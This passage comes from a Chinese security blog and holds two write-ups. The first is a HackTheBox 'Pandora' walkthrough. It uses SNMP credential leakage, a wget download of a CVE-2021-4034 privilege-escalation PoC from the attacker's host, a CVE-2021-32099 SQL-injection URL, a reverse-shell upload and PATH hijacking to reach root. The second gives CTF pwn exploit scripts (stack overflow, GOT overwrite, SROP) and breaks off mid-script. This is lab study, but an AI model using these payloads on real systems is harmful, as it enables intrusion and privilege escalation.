closed ports</span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">22/tcp    open          ssh</span><br><span class="line">80/tcp    open          http</span><br><span class="line">161/udp   open|filtered snmp</span><br><span class="line">1032/udp  open|filtered iad3</span><br><span class="line">31731/udp open|filtered unknown</span><br><span class="line">36669/udp open|filtered unknown</span><br></pre></td></tr></table></figure><p>发现有熟悉的80端口，用浏览器去访问下</p><p><img src="image-20220309102901245.png" alt="image-20220309102901245"></p><p>发现除了静态前端外，基本没有什么敏感点。</p><p><img src="image-20220309104114607.png" alt="image-20220309104114607"></p><p>除了有一次看起来有问题的信息反馈，但测试下在我们前端并无明显反馈，且不像用sql注入之内的的漏洞，更像是功能没用写全……</p><p>然后看下DNS映射，<code>Pandora.htb</code>域名对外映射的就是我们访问的web服务。</p><p>没用什么思路，用dirseach 扫描下路径看下有没有什么有用的信息。</p><p>执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 dirsearch.py -u 10.10.11.136</span><br></pre></td></tr></table></figure><p>得到结果：</p><p><img src="image-20220309111906091.png" alt="image-20220309111906091"></p><p>仔细审查下，发现assets目录貌似有一个目录穿越</p><p><img src="image-20220309112415563.png" alt="image-20220309112415563"></p><p>然后发现都跟页面显示相关……没有什么可以利用点。</p><p>回到nmap信息，发现除了ssh服务和web服务还有snmp服务：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">161&#x2F;udp   open|filtered snmp</span><br></pre></td></tr></table></figure><p>先用<code>searchsploit  snmp</code>查询下发现这个服务还挺多问题的：</p><p><img src="image-20220309130158869.png" alt="image-20220309130158869"></p><p>通过谷歌找了篇文章来了解snmp的大概：</p><p><a href="https://www.anquanke.com/post/id/260832" target="_blank" rel="noopener">https://www.anquanke.com/post/id/260832</a></p><p>了解到SNMP协议主要用来接收网络节点的通知消息和警告时间报告等，从而获知网络出现的问题。</p><p>而文章中提到了一种工具 snmpwalk，snmpwalk是SNMP的一个工具，它使用SNMP的GETNEXT请求查询指定OID（SNMP协议中的对象标识）入口的所有OID树信息，并显示给用户。snmpwalk使用方法很简单，如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 1或2c(代表SNMP版本) -c SNMP读团体密码 IP地址 OID(对象标示符)</span><br><span class="line">–v：指定snmp的版本, 1或者2c，该参数必须有。</span><br><span class="line">–c：指定连接设备SNMPSNMP读团体密码，该参数必须有。 密码一般在snmpd.conf中,默认为public</span><br><span class="line">IP：指定要walk的设备的IP地址，该参数必须有。</span><br><span class="line">OID：代表要获取设备的指标oid，该参数不是必须的。</span><br></pre></td></tr></table></figure><p>具体可以查看：</p><p><a href="https://www.cnblogs.com/--smile/p/11086770.html" target="_blank" rel="noopener">https://www.cnblogs.com/--smile/p/11086770.html</a></p><p>执行命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">snmpwalk -v 2c Pandora.htb –c public &gt; 1.txt</span><br></pre></td></tr></table></figure><p>在1.txt 发现一个有意识的命令执行记录：</p><p><img src="image-20220309223818806.png" alt="image-20220309223818806"></p><p>推测是有个用户名为dantel 密码为HotelBabylon23</p><p>用ssh 登录看看</p><p><img src="image-20220309231540290.png" alt="image-20220309231540290"></p><p>发现成功登录，但user flag 在另一个用户目录下没有权限读取。</p><p><img src="image-20220309231702161.png" alt="image-20220309231702161"></p><p>这里用<code>lsb_release -a</code>  和<code>uname -r</code>来查询发行版本与内核版本。</p><p><img src="image-20220309232153234.png" alt="image-20220309232153234"></p><p>发现是Ubuntu 20.04.3 LTS，于是谷歌下发现有CVE-2021-4034提取。在github上找了个poc：</p><p><a href="https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py" target="_blank" rel="noopener">https://github.com/nikaiw/CVE-2021-4034/blob/master/cve2021-4034.py</a></p><p>用python 来搭建简单http服务：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 9090</span><br></pre></td></tr></table></figure><p>执行上面命令。在自己的电脑9090端口开启web服务。</p><p>在靶场机器上执行<code>wget 10.10.14.94:9090/cve2021-4034.py</code>来获取poc：</p><p><img src="image-20220309233250045.png" alt="image-20220309233250045"></p><p>执行poc，来获得root:</p><p><img src="image-20220309233402834.png" alt="image-20220309233402834"></p><p>这里一下全到root才发现自己可能非预期了，但已经有权限读取root.txt和user.txt了</p><p><img src="image-20220309233503275.png" alt="image-20220309233503275"></p><h2 id="正常解法"><a href="#正常解法" class="headerlink" title="正常解法"></a>正常解法</h2><p>在看了其他大佬wp发现自己完全避开，关键点…..tcl.</p><p>由于daniel用法在curl 80端口时出现不同页面，所有怀疑有内网服务。</p><p>用命令:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8001:127.0.0.1:80  daniel@10.10.11.136</span><br></pre></td></tr></table></figure><p>来转发端口，可以看到有个全新web页面</p><p><img src="image-20220310150454237.png" alt="image-20220310150454237"></p><p>根据下方提示版本，谷歌后发现是Pandora模板（正好点题）</p><p>d但是我们不知道后台密码，经过谷歌后发现CVE-2021-32099可以通过sql注入获得admin cookie</p><p>poc 如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost:8000&#x2F;pandora_console&#x2F;include&#x2F;chart_generator.php?session_id&#x3D;a%27%20UNION%20SELECT%20%27a%27,1,%27id_usuario|s:5:%22admin%22;%27%20as%20data%20FROM%20tsessions_php%20WHERE%20%271%27&#x3D;%271</span><br></pre></td></tr></table></figure><p>然后我们进入管理页面，</p><p><img src="image-20220310150437770.png" alt="image-20220310150437770"></p><p>在后门页面的admin tools 的文件管理里上传后门反弹shell文件</p><p><img src="image-20220310150914241.png" alt="image-20220310150914241"></p><p>通过base64 解密url中base64部分得到相对位置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─# echo L3BhbmRvcmFfY29uc29sZS9pbmNsdWRlLy4uLy9hdHRhY2htZW50L2ZpbGVzX3JlcG8vMV9hYWEucGhw|base64 -d</span><br><span class="line">&#x2F;pandora_console&#x2F;include&#x2F;..&#x2F;&#x2F;attachment&#x2F;files_repo&#x2F;1_aaa.php</span><br></pre></td></tr></table></figure><p>访问后门得到shell</p><p><img src="image-20220310143003847.png" alt="image-20220310143003847"></p><p>用<code>find / -perm -u=s 2&gt; /dev/null</code> 找是否用权限配置有问题的命令</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;usr&#x2F;bin&#x2F;sudo</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pkexec</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chfn</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;newgrp</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;gpasswd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;umount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pandora_backup</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;passwd</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;mount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;su</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;at</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;fusermount</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;chsh</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;openssh&#x2F;ssh-keysign</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;dbus-1.0&#x2F;dbus-daemon-launch-helper</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;eject&#x2F;dmcrypt-get-device</span><br><span class="line">&#x2F;usr&#x2F;lib&#x2F;policykit-1&#x2F;polkit-agent-helper-1</span><br></pre></td></tr></table></figure><p>发现/usr/bin/pandora_backup 有点可疑。</p><p>运行后，shell崩了，可能用什么报错信息未看到，用python 加固shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#39;import pty; pty.spawn(&quot;&#x2F;bin&#x2F;bash&quot;)&#39;</span><br></pre></td></tr></table></figure><p>cp  pandora_backup  到web 目录<code>/var/www/pandora/pandora_console/images</code>下,在我们用户机器上访问下载。</p><p>在ida 里F5反汇编:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">__uid_t</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  <span class="keyword">__uid_t</span> v4; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  v3 = getuid();</span><br><span class="line">  v4 = geteuid();</span><br><span class="line">  setreuid(v4, v3);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"PandoraFMS Backup Utility"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Now attempting to backup PandoraFMS client"</span>);</span><br><span class="line">  <span class="keyword">if</span> ( system(<span class="string">"tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*"</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Backup failed!\nCheck your permissions!"</span>);</span><br><span class="line">    result = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Backup successful!"</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Terminating program!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>发现程序调用tar 但是使用system来调用，没用明确是哪个tar，我们可以伪造一个tar添加到环境变量中，让系统调用我们就可</p><p>切换到matt的用户目录，然后创建由<code>/bin/bash</code>一个假的tar可执行文件，并将matt的家路径注入PATH变量中,这样可以在<code>tar -cvf /root/.backup/pandora-backup.tar.gz /var/www/pandora/pandora_console/*</code>命令结束后仍然在/bin/bash命令中</p><p>这是本地用/bin/sh做的实验：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─# .&#x2F;tar -cvf &#x2F;root&#x2F;.backup&#x2F;pandora-backup.tar.gz &#x2F;var&#x2F;www&#x2F;pandora&#x2F;pandora_console</span><br><span class="line"># </span><br><span class="line">#</span><br></pre></td></tr></table></figure><p>因此我们在远程伪造</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cd &#x2F;home&#x2F;matt&#x2F;</span><br><span class="line">echo &quot;&#x2F;bin&#x2F;bash&quot; &gt; tar</span><br><span class="line">chmod +x tar</span><br><span class="line">export PATH&#x3D;&#x2F;home&#x2F;matt:$PATH</span><br><span class="line">&#x2F;usr&#x2F;bin&#x2F;pandora_backup</span><br></pre></td></tr></table></figure><p>然后得到root</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;hackthebox-Pandora-Machine</summary>
    
    
    
    <category term="HTB" scheme="lexsd6.github.io/categories/HTB/"/>
    
    
    <category term="Machine" scheme="lexsd6.github.io/tags/Machine/"/>
    
  </entry>
  
  <entry>
    <title>HSC2021-CTF-pwn</title>
    <link href="lexsd6.github.io/2022/02/22/HSC2021-CTF/"/>
    <id>lexsd6.github.io/2022/02/22/HSC2021-CTF/</id>
    <published>2022-02-22T09:34:26.542Z</published>
    <updated>2022-02-22T12:29:12.169Z</updated>
    
    <content type="html"><![CDATA[<p>红客突击队ctf，好久没打ctf了，正好适合用来练手，感觉自己又变菜了……<a id="more"></a></p><h2 id="EZ-pwn"><a href="#EZ-pwn" class="headerlink" title="EZ_pwn"></a>EZ_pwn</h2><p>真ez pwn 题目给了后门，栈溢出改RIP为后门地址。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:12:39</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./Ez_pwn'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10366</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">debug()</span><br><span class="line">p.sendline(<span class="string">'1'</span>*<span class="number">0x40</span>+<span class="string">'2'</span>*<span class="number">8</span>+p64(e.sym[<span class="string">'backdoor'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="EZPWN"><a href="#EZPWN" class="headerlink" title="EZPWN"></a>EZPWN</h2><p>题目给了后门。分析程序流程，发现题目有个任意执行写，篡改put函数的got表值虫二劫持got表运行后门</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:21:21</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">1</span></span><br><span class="line">elf=<span class="string">'./EZPWN'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10027</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'your ID?'</span>)</span><br><span class="line">p.sendline(<span class="string">'xxxxx'</span>)</span><br><span class="line">debug()</span><br><span class="line">p.recvuntil(<span class="string">'Give me the target address?'</span>)</span><br><span class="line">p.sendline(str(<span class="number">0x601018</span>))</span><br><span class="line">p.recvuntil(<span class="string">'Give me the data:'</span>)</span><br><span class="line">p.sendline(p64(e.sym[<span class="string">'success'</span>]))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="SAHELL"><a href="#SAHELL" class="headerlink" title="SAHELL"></a>SAHELL</h2><p>题目欺诈，实际上考的是SROT与写shell。</p><p>即及利用SPOT在一块可以控制地址区域写入shellcode，让后再调用shellcode。</p><p>但要注意的是这里连续调用两次syscall.</p><p>第一次我们利用syscall  通过SYS_rt_sigreturn 劫持栈与程序流。</p><p>但是SYS_rt_sigreturn的系统调用号为<code>0xf</code>.</p><p>因此我们用利用x64下系统调用read的返回值为输入字符数来篡改返回值（rax）为<code>0xf</code></p><p>同时，由于我们连续调用syscall，且rt_sigreturn破坏原本栈结构。我们伪造的<code>signal Frame</code>也要注意各寄存器外，<code>uc_stack</code>和<code>Segment Registers(SS, FS, GS, CS)</code>等参数也要注意实际情况。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#推荐模板：</span></span><br><span class="line">sigret_frame = [</span><br><span class="line">    p64(<span class="number">0x0000000000000007</span>),   <span class="comment"># uc_flags</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_link</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_stack.ss_sp</span></span><br><span class="line">    p64(<span class="number">0x0000ffff00000000</span>),   <span class="comment"># uc_stack.ss_flags</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_stack.ss_size</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R8</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R9</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R10</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R11</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R12</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R13</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R14</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># R15</span></span><br><span class="line">    p64(<span class="number">0x0000000000402000</span>),   <span class="comment"># RDI</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># RSI</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RBP</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RBX</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># RDX</span></span><br><span class="line">    p64(<span class="number">0x000000000000003b</span>),   <span class="comment"># RAX</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RCX</span></span><br><span class="line">    p64(<span class="number">0xdeadbeefdeadbeef</span>),   <span class="comment"># RSP</span></span><br><span class="line">    p64(SYSCALL),   <span class="comment"># RIP = should call 'syscall' instruction</span></span><br><span class="line">    p64(<span class="number">0x0000000000000202</span>),   <span class="comment"># EFLAGS</span></span><br><span class="line">    p64(<span class="number">0x002b000000000033</span>),   <span class="comment"># Segment Registers(SS, FS, GS, CS)</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># ERR</span></span><br><span class="line">    p64(<span class="number">0x0000000000000001</span>),   <span class="comment"># TrapNo</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># Old-Mask</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># CR2</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># fpstate = NULL</span></span><br><span class="line">    p64(<span class="number">0x000000000000000e</span>),   <span class="comment"># reserved</span></span><br><span class="line">    p64(<span class="number">0x0000000000000000</span>),   <span class="comment"># uc_sigmask</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure><p>同时，由于SYS_rt_sigreturn的返回值刚好为0，即read的系统调用号，我们就可以直接将RIP修改为syscall地址。就可以执行sys_read调用写入并指向shellcode</p><p>完整exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">@File    :   exp.py</span></span><br><span class="line"><span class="string">@Time    :   2022/02/20 11:39:04</span></span><br><span class="line"><span class="string">@Author  :   lexsd6</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"><span class="keyword">from</span> libcfind <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local_mote=<span class="number">0</span></span><br><span class="line">elf=<span class="string">'./SAHELL'</span></span><br><span class="line">e=ELF(elf)</span><br><span class="line">context.arch=e.arch</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">ip_port=[<span class="string">'hsc2019.site'</span>,<span class="number">10774</span>]</span><br><span class="line"></span><br><span class="line">debug=<span class="keyword">lambda</span> gdb_cmd=<span class="string">''</span>: gdb.attach(p,gdb_cmd) <span class="keyword">if</span> local_mote==<span class="number">1</span> <span class="keyword">else</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local_mote==<span class="number">1</span> :</span><br><span class="line">   p=process(elf)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">   p=remote(ip_port[<span class="number">0</span>],ip_port[<span class="number">-1</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#debug('b main')</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">shellcodeaddr=<span class="number">0x00600000</span></span><br><span class="line">rbp=shellcodeaddr</span><br><span class="line"><span class="comment">#asm(shellcraft.sh())</span></span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">sigret_frame = [</span></span><br><span class="line"><span class="string">    p64(0x0000000000000007),   # uc_flags</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_link</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_stack.ss_sp</span></span><br><span class="line"><span class="string">    p64(0x0000ffff00000000),   # uc_stack.ss_flags</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # uc_stack.ss_size</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R8</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R9</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R10</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R11</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R12</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R13</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R14</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # R15</span></span><br><span class="line"><span class="string">    p64(0x0000000000402000),   # RDI</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # RSI</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RBP</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RBX</span></span><br><span class="line"><span class="string">    p64(0x0000000000000000),   # RDX</span></span><br><span class="line"><span class="string">    p64(0x000000000000003b),   # RAX</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RCX</span></span><br><span class="line"><span class="string">    p64(0xdeadbeefdeadbeef),   # RSP</span></span><br><span class="line"><span class="string">    p64(SYSCALL),   # RIP = should call 